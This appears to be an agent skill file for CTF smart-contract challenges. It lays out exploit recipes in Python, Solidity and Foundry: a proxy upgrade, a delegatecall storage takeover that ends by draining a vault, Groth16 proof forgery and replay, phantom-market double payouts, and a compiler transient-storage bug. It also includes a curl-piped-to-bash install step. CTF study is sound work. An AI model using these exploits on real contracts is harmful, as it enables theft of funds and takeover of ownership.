---
name: web-web3
description: "CTF Web3/blockchain challenges. EIP-1967 proxy exploitation, ABI coder v1 dirty address bypass, Groth16 proof forgery, delegatecall storage abuse, Solidity transient storage bug, phantom market manipulation, Foundry/cast tools. Triggers: 'web3 ctf', 'solidity exploit', 'smart contract', 'blockchain ctf', 'proxy pattern', 'delegatecall', 'groth16', 'zk proof', 'evm exploit', 'foundry ctf'."
---

# CTF Web3: Smart Contract Exploitation

EIP-1967 proxy, ABI coder bypass, ZK proof forgery, delegatecall storage abuse.

## Install

```bash
# Foundry (cast, forge, anvil):
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Python web3:
pip install web3 py_ecc eth_account requests --break-system-packages
```

---

## Phase 1: Challenge Infrastructure

```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

PRIVATE_KEY = "0x..."
BASE = "https://CTF_INSTANCE"

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()

# 1. Get nonce:
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']

# 2. Sign:
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)

# 3. Login:
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower()  # some CTFs require lowercase
})
s.cookies.set('token', r.json()['token'])

# 4. Create instance:
s.post(f'{BASE}/api/challenges/create-instance')

# 5. Check solution:
result = s.get(f'{BASE}/api/challenges/check-solution').json()
print(result)
```

---

## Phase 2: EIP-1967 Proxy Exploitation

```bash
# Proxy delegates to implementation, storage is on proxy
# Storage slots:
IMPL_SLOT="0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
ADMIN_SLOT="0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103"

RPC="https://ethereum-sepolia-rpc.publicnode.com"
PROXY="0xCONTRACT"

# Read implementation address:
cast storage $PROXY $IMPL_SLOT --rpc-url $RPC

# Read admin:
cast storage $PROXY $ADMIN_SLOT --rpc-url $RPC

# Call implementation as admin:
cast send $PROXY "upgradeTo(address)" $NEW_IMPL --private-key $KEY --rpc-url $RPC

# address(this) in delegatecall always refers to PROXY, not implementation
```

---

## Phase 3: ABI Coder v1 Dirty Address Bypass

```bash
# Solidity 0.8 default ABI coder v2 validates address has zero upper 12 bytes
# If contract uses pragma abicoder v1 → no validation

# Detect: call reverts with empty data ("0x") = ABI v2 validation failure
# Fix: deploy implementation with pragma abicoder v1

# Craft dirty address (non-zero upper bytes):
# Address format: 0x000000000000000000000000<20 bytes>
# Dirty: 0xDEADBEEF000000000000000000000000<20 bytes>

DIRTY_ADDR="0xDEADBEEF0000000000000000DEADBEEF00000001"

# Deploy with ABI v1 to get bytecode, then swap implementation:
# forge create --via-ir=false src/Contract.sol:Contract --rpc-url $RPC
```

---

## Phase 4: Delegatecall Storage Context Abuse

```solidity
// Vault with delegatecall and no access control on setGovernance

// Storage layout MUST match vault:
contract Attacker {
    bool public paused;       // slot 0 (same as vault)
    uint248 public fee;       // slot 0 (same as vault)
    address public admin;     // slot 1 (same as vault)
    address public governance; // slot 2

    function attack(address newAdmin) public {
        paused = false;       // writes to vault slot 0
        admin = newAdmin;     // writes to vault slot 1 = admin takeover
    }
}
```

```bash
# 1. Deploy Attacker:
forge create src/Attacker.sol:Attacker --rpc-url $RPC --private-key $KEY

# 2. Hijack governance (unprotected):
cast send $VAULT "setGovernance(address)" $ATTACKER_ADDR --rpc-url $RPC --private-key $KEY

# 3. Execute delegatecall → attack():
CALLDATA=$(cast calldata "attack(address)" $MY_ADDRESS)
cast send $VAULT "execute(bytes)" $CALLDATA --rpc-url $RPC --private-key $KEY

# 4. Drain as new admin:
cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
```

---

## Phase 5: Groth16 Proof Forgery

```python
from py_ecc.bn128 import G1, G2, multiply, add, neg, pairing

# When vk_delta_2 == vk_gamma_2 → trivially forge any proof:
def forge_groth16_proof(vk):
    if vk['vk_delta_2'] == vk['vk_gamma_2']:
        print("Broken setup! Trivial forgery possible")
        
        # Forged proof: A = alpha, B = beta, C = -public_input_accumulator
        forged_A = vk['vk_alpha_1']
        forged_B = vk['vk_beta_2']
        forged_C = neg(vk['vk_x'])  # negate public input accumulator
        
        return {'a': forged_A, 'b': forged_B, 'c': forged_C}
    
    # Proof replay: if nullifier not tracked
    # Extract valid proof from deployment transaction
    # Replay for every proposal (no nullifier check)
    return None

# Check for replay vulnerability:
# Search deployment tx for valid proof, then reuse it
```

---

## Phase 6: Phantom Market + Force Fund

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider(RPC))

# Force-fund contract via selfdestruct in constructor (EIP-6780):
FORCE_SEND_BYTECODE = """
pragma solidity ^0.8.28;
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);  // Forces ETH even to contracts without receive()
    }
}
"""

# Bet on phantom market ID (market not yet created):
PHANTOM_MARKET_ID = 999  # beyond nextMarketIndex

# Step 1: Force-fund DAO:
# Deploy ForceSend with value targeting DAO address

# Step 2: Bet on phantom market:
# dao.bet(PHANTOM_MARKET_ID, isYes=False, amount=1)

# Step 3: DAO votes to bet YES on same market:
# proposal → delegatecall → bet(PHANTOM_MARKET_ID, true, 2*marketBalance)

# Step 4: Resolve market NO → cash out helper1

# Step 5: Create real market that reuses PHANTOM_MARKET_ID:
# dao.createMarket() → overwrites marketResolution[N]=0 (unresolves!)
# totalYesBet from DAO's original bet PERSISTS

# Step 6: Cash out again:
# helper2.bet(N, false, 1) → resolve NO → payout = 1 + 2*marketBalance
```

---

## Phase 7: Solidity Transient Storage Bug (0.8.28-0.8.33)

```bash
# Bug: pragma abicoder v1/delete creates wrong opcode for transient storage
# Affected: --via-ir pipeline, Solidity 0.8.28-0.8.33

# Check compiler version in contract:
cast call $CONTRACT "SOLIDITY_VERSION()(string)" --rpc-url $RPC
# Or check etherscan/sourcify for pragma version

# Symptom 1: delete _lock uses sstore instead of tstore
# → Writes zero to slot 0 → owner gets overwritten!
# Exploit: call guarded() → _lock.delete corrupts owner → take ownership

# Symptom 2: delete of persistent var uses tstore
# → Approval/mapping can't be revoked
# Exploit: get approval, victim tries to revoke, but approval persists

# Workaround in exploit:
# Direct zero assignment works correctly: `_lock = address(0)` uses correct opcode
```

---

## Phase 8: Foundry Tools Reference

```bash
# Read-only calls:
cast call $CONTRACT "balanceOf(address)(uint256)" $ADDR --rpc-url $RPC
cast storage $CONTRACT 0 --rpc-url $RPC              # read slot 0
cast storage $CONTRACT $SLOT --rpc-url $RPC          # read specific slot

# Write calls:
cast send $CONTRACT "function(args)" $ARGS --private-key $KEY --rpc-url $RPC

# Deploy:
forge create src/Contract.sol:Contract --private-key $KEY --rpc-url $RPC

# Calldata encoding:
cast calldata "function(address,uint256)" $ADDR 1000

# Decode:
cast abi-decode "function(address)(uint256)" $CALLDATA

# Get transaction:
cast tx $TX_HASH --rpc-url $RPC

# Key insights:
# - Empty revert data ("0x") = ABI decoder validation failure
# - Contract nonce starts at 1 (0 = EOA)
# - Derive child address: keccak256(rlp([parent_addr, nonce]))[-20:]
```

---

## Output

Save to `.omop/engagement/ctf/web/web3/`:
- `exploit.py`: Python exploit script
- `exploit-contracts/`: Foundry contracts used
- `flag.txt`: captured flag

## Next Phase

→ `ctf-web-auth-access` for auth bypass
→ `ctf-web-client-side` for client-side attacks
